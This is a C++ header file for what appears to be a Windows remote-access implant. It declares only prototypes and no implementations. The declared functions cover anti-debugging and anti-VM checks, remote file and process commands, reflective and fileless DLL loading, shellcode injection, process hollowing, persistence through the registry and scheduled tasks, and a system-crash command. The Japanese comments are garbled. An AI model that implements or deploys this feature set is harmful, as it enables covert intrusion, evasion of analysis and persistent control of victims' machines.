#pragma once


#include <map>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <string>
#include <iomanip>
#include <Winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <MSWSock.h>
#include <lmcons.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <set>
#include <thread>
#include <chrono>
#include <filesystem>
#include <fstream>
#include "NtAPi.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")

// �f�t�H���g�o�b�t�@
constexpr auto DEFAULT_BUFLEN = 4096;

extern SOCKET mainSocket;
extern int port;
extern std::set<std::string> helpOptions;
extern const std::string newline;

using CommandFunction = void(*)(std::vector<std::string>&);

// �A���`�f�o�b�O
void IsDebuggerPresentByAPI();
void NtGlobalFlagByPEB();
void CheckRemoteDebugger();
void AntiDbg();

// �A���`���z�}�V��
void CheckBIOS();
void CheckProcesses();
void CheckDrivers();
void CheckRegistry();
void AntiVM();

// �R�}���h���X�g
void Help(std::vector<std::string>& tokens);
void Netstat(std::vector<std::string>& tokens);
void Pwd(std::vector<std::string>& tokens);
void ProcessList(std::vector<std::string>& tokens);
void Copy(std::vector<std::string>& tokens);
void Move(std::vector<std::string>& tokens);
void Remove(std::vector<std::string>& tokens);
void Dir(std::vector<std::string>& tokens);
void Cat(std::vector<std::string>& tokens);
void Write(std::vector<std::string>& tokens);
void Touch(std::vector<std::string>& tokens);
void TerminateProcess(std::vector<std::string>& tokens);
void CreatingProcess(std::vector<std::string>& tokens);

void Cd(std::vector<std::string>& tokens);
void screenshot(std::vector<std::string>& tokens);
void UploadFile(std::vector<std::string>& tokens);
void DownloadFile(std::vector<std::string>& tokens);
void MkDir(std::vector<std::string>& tokens);
void Rmdir(std::vector<std::string>& tokens);

// �y�C���[�h�ǂݍ��݃R�}���h
void DllLoad(std::vector<std::string>& tokens);
void FilelessReflectiveDllLoad(std::vector<std::string>& tokens);
void ReflectiveDllLoad(std::vector<std::string>& tokens);

// �v���Z�X�C���W�F�N�V�����R�}���h
void DllInjection(std::vector<std::string>& tokens);
void ReflectiveDllInjection(std::vector<std::string>& tokens);
void ShellcodeInjection(std::vector<std::string>& tokens);
void AsyncProcedureCallDllInjection(std::vector<std::string>& tokens);
void ProcessHollowing(std::vector<std::string>& tokens);
void FilelessShellcodeInjection(std::vector<std::string>& tokens);
void FilelessReflectiveDLLInjection(std::vector<std::string>& tokens);

// �o�b�N�h�A�R�}���h
void RunRegistry(std::vector<std::string>& tokens);
void TaskSchedule(std::vector<std::string>& tokens);
void Startup(std::vector<std::string>& tokens);

// ���̑��R�}���h
void ShowMessageBox(std::vector<std::string>& tokens);
void SystemCrash(std::vector<std::string>& tokens);

// ���̑��֐�
std::wstring ConvertToWString(const std::string& str);
void SendString(const std::string& message);
std::vector<std::string> ParseCommand(const std::string& input);
void ExecuteCommand(std::vector<std::string>& tokens);
void SendPrompt(SOCKET mainSocket);